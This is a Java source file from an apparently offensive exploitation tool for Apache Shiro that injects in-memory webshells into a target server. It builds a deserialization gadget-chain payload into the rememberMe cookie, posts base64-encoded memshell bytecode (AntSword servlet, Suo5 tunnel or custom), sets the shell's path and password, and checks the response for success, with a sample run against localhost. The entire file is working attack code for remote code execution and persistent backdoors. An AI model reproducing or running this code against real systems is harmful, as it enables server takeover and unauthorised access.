package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import javassist.*;
import okhttp3.FormBody;

import java.lang.reflect.Method;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * 内存马注入服务
 * 提供完整的内存马注入流程
 */
public class MemshellService {
    /**
     * 内存马注入结果
     */
    public static class InjectResult {
        public boolean success;
        public String message;
        public String response;
        public String memshellType;
        public String path;           // 只包含路径，不拼接域名
        public String password;
        public String headerName;     // Suo5 专用：认证 Header 名称
        public String headerValue;    // Suo5 专用：认证 Header 值
        public String remark;         // 内存马备注说明

        public InjectResult(boolean success, String message, String response, String memshellType, String path, String password) {
            this(success, message, response, memshellType, path, password, null, null, null);
        }

        public InjectResult(boolean success, String message, String response, String memshellType, String path, String password, String headerName, String headerValue, String remark) {
            this.success = success;
            this.message = message;
            this.response = response;
            this.memshellType = memshellType;
            this.path = path;
            this.password = password;
            this.headerName = headerName;
            this.headerValue = headerValue;
            this.remark = remark;
        }
    }

    /**
     * 注入内存马（预设类型）
     * @param targetOBJ 请求对象
     * @param memshellType 内存马类型
     * @param path 内存马路径
     * @param password 内存马密码
     * @param gadget 指定利用gadget
     * @return 注入结果
     */
    public static InjectResult injectMemshell(TargetOBJ targetOBJ, String memshellType, String path, String password, String gadget) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass memshellCtClass = pool.getCtClass("com.y5neko.shiroexp.memshell." + memshellType);

        // 获取内存马字节码
        byte[] memshellBytes = memshellCtClass.toBytecode();
        String memshellPayload = Base64.getEncoder().encodeToString(memshellBytes);

        // 获取备注信息
        String remark = getMemshellRemark(memshellType);

        // 统一传递所有参数（生成随机值），由内存马自己决定是否使用
        String headerName = generateRandomString(8);
        String headerValue = generateRandomString(16);

        return injectMemshellInternal(targetOBJ, memshellPayload, memshellType, path, password, gadget, headerName, headerValue, remark);
    }

    /**
     * 注入内存马（自定义字节码）
     * @param targetOBJ 请求对象
     * @param customBase64 自定义内存马的 Base64 字节码
     * @param path 内存马路径
     * @param password 内存马密码
     * @param gadget 指定利用gadget
     * @param isCustom 是否为自定义内存马（必须为 true）
     * @return 注入结果
     */
    public static InjectResult injectMemshell(TargetOBJ targetOBJ, String customBase64, String path, String password, String gadget, boolean isCustom) throws Exception {
        if (!isCustom) {
            // 如果不是自定义模式，调用预设方法
            return injectMemshell(targetOBJ, customBase64, path, password, gadget);
        }

        // 自定义内存马模式：直接使用传入的 Base64 字节码
        // 统一生成随机header值，由内存马自己决定是否使用
        String headerName = generateRandomString(8);
        String headerValue = generateRandomString(16);
        String remark = getMemshellRemark("自定义内存马");
        return injectMemshellInternal(targetOBJ, customBase64, "自定义内存马", path, password, gadget, headerName, headerValue, remark);
    }

    /**
     * 内部注入方法（统一处理逻辑）
     * @param targetOBJ 请求对象
     * @param memshellPayload 内存马字节码的 Base64 编码
     * @param memshellType 内存马类型（用于日志显示）
     * @param path 内存马路径
     * @param password 内存马密码
     * @param gadget 指定利用gadget
     * @param headerName 认证 Header 名称（统一传递，由内存马决定是否使用）
     * @param headerValue 认证 Header 值（统一传递，由内存马决定是否使用）
     * @param remark 内存马备注说明
     * @return 注入结果
     */
    private static InjectResult injectMemshellInternal(TargetOBJ targetOBJ, String memshellPayload, String memshellType, String path, String password, String gadget, String headerName, String headerValue, String remark) throws Exception {

        // 获取内存马注入的payload
        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
        Method method = gadget_clazz.getDeclaredMethod("genMemPayload", String.class, String.class);
        String payload = (String) method.invoke(null, targetOBJ.getKey(), targetOBJ.getCryptType());

        // 构造请求头
        Map<String, String> headers = new HashMap<>();
        headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
        headers.put("p", password);
        headers.put("path", path);
        headers.put("headerName", headerName);
        headers.put("headerValue", headerValue);

        // 构造POST请求体
        FormBody formBody = new FormBody.Builder().add("token", memshellPayload).build();

        // 注入内存马
        ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, formBody, headers, "POST");
        String responseStr = Tools.bytesToString(responseOBJ.getResponse());

        // 解析 Suo5 的认证信息（响应中会返回设置的值）
        String responseHeaderName = headerName;
        String responseHeaderValue = headerValue;
        if (responseStr.contains("Header-Name:") && responseStr.contains("Header-Value:")) {
            try {
                // 提取 Header-Name: xxx | Header-Value: xxx
                int headerNameIndex = responseStr.indexOf("Header-Name:");
                int headerValueIndex = responseStr.indexOf("Header-Value:");
                if (headerNameIndex != -1 && headerValueIndex != -1) {
                    // 提取 Header-Name 后面的值
                    int headerNameStart = headerNameIndex + "Header-Name:".length();
                    int headerNameEnd = responseStr.indexOf("|", headerNameStart);
                    if (headerNameEnd == -1 || headerNameEnd > headerValueIndex) {
                        headerNameEnd = responseStr.indexOf(" |", headerNameStart);
                        if (headerNameEnd == -1) headerNameEnd = responseStr.length();
                    }
                    responseHeaderName = responseStr.substring(headerNameStart, headerNameEnd).trim();

                    // 提取 Header-Value 后面的值
                    int headerValueStart = headerValueIndex + "Header-Value:".length();
                    int headerValueEnd = responseStr.indexOf("|", headerValueStart);
                    if (headerValueEnd == -1) {
                        headerValueEnd = responseStr.length();
                    }
                    responseHeaderValue = responseStr.substring(headerValueStart, headerValueEnd).trim();
                }
            } catch (Exception e) {
                // 解析失败，使用工具生成的值
            }
        }

        // 确保 path 以 / 开头
        String memshellPath = path;
        if (!memshellPath.startsWith("/")) {
            memshellPath = "/" + memshellPath;
        }

        // 根据注入结果返回
        if (responseStr.contains("Success")) {
            return new InjectResult(true, "内存马注入成功", responseStr, memshellType, memshellPath, password, responseHeaderName, responseHeaderValue, remark);
        } else {
            return new InjectResult(false, "内存马注入失败：响应中未找到 Success 标记\n（不一定注入失败，可能只是回显有问题，可以手动尝试连接）", responseStr, memshellType, memshellPath, password, responseHeaderName, responseHeaderValue, remark);
        }
    }

    /**
     * 获取内存马备注信息
     * @param memshellType 内存马类型
     * @return 备注信息
     */
    private static String getMemshellRemark(String memshellType) {
        return com.y5neko.shiroexp.config.AllList.getMemshellRemark(memshellType);
    }

    /**
     * 生成随机字符串（用于 Suo5 认证）
     * @param length 字符串长度
     * @return 随机字符串
     */
    private static String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt((int)(Math.random() * chars.length())));
        }
        return sb.toString();
    }

    public static void main(String[] args) throws Exception {
        InjectResult result = injectMemshell(new TargetOBJ("http://127.0.0.1:8080"),"AntSwordServlet", "/qwer333", "test123", "CommonsBeanutils1");
        if (result.success) {
            System.out.println(Log.buffer_logging("SUCC", result.message));
            System.out.println("----------");
            System.out.println("类型: " + result.memshellType);
            System.out.println("地址: " + result.path);
            System.out.println("密码: " + result.password);
            System.out.println("----------");
        } else {
            System.out.println(Log.buffer_logging("EROR", result.message));
            System.out.println("----------");
            System.out.println("响应内容: " + result.response);
            System.out.println("----------");
        }
    }
}
